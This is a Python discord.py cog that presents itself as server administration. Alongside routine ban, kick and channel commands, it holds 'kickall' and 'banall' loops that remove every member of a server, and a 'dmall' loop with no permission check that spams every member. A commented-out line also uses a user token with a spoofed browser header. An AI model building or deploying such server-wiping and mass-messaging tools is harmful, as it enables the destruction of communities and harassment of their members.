import discord
import asyncio
import requests
import json
from discord.ext import commands
from discord.ext.commands import has_permissions

with open("config.json") as f:
    c = json.load(f)

class Administration(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.command()
    @has_permissions(ban_members=True)
    async def banuser(self,ctx,user:discord.Member,*,reason:str=None):
        await ctx.message.delete()
        try:
            await user.ban(reason=reason)
        except Exception as err:
            print(err)
    @commands.command()
    @has_permissions(kick_members=True)
    async def kickuser(self,ctx,user:discord.Member):
        await ctx.message.delete()
        try:
            #await requests.delete("https://discord.com/api/v9/guilds/966717843800465479/members/925420576221311016?reason=fe", headers={"Authorization":c["token"],"Content-Type": "application/json", "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44"}, json={''})
            await user.kick(reason=None)
        except Exception as err:
            print(err)

    @commands.command()
    @has_permissions(manage_channels=True)
    async def textchannel(self,ctx,*,name:str=None):
        await ctx.message.delete()
        await ctx.guild.create_text_channel(name)
    @commands.command()
    @has_permissions(manage_channels=True)
    async def voicechannel(self,ctx,*,name:str=None):
        await ctx.message.delete()
        await ctx.guild.create_voice_channel(name)
    @commands.command()
    @has_permissions(manage_channels=True)
    async def category(self,ctx,*,name:str=None):
        await ctx.message.delete()
        await ctx.guild.create_category(name)

    @commands.command()
    @has_permissions(kick_members=True)
    async def kickall(self,ctx):
        await ctx.message.delete()
        while True:
            try:
                for user in list(ctx.guild.members):
                    try:
                        await ctx.guild.kick(user)
                        await asyncio.sleep(2)
                    except Exception as err:
                        print(err)
            except Exception as err:
                print(err)
    @commands.command()
    @has_permissions(ban_members=True)
    async def banall(self,ctx):
        await ctx.message.delete()
        while True:
            try:
                for user in list(ctx.guild.members):
                    try:
                        await ctx.guild.ban(user)
                        await asyncio.sleep(2)
                    except Exception as err:
                        print(err)
            except Exception as err:
                print(err)
    @commands.command()
    async def dmall(self,ctx,*,l):
        await ctx.message.delete()
        if not l: return
        
        while True:
            try:
                for a in list(ctx.guild.members):
                    try:
                        await a.send(l)
                        await asyncio.sleep(15)
                    except Exception as err:
                        print(f'{err}')
            except Exception as err:
                print(f'{err}')
def setup(bot):
    bot.add_cog(Administration(bot))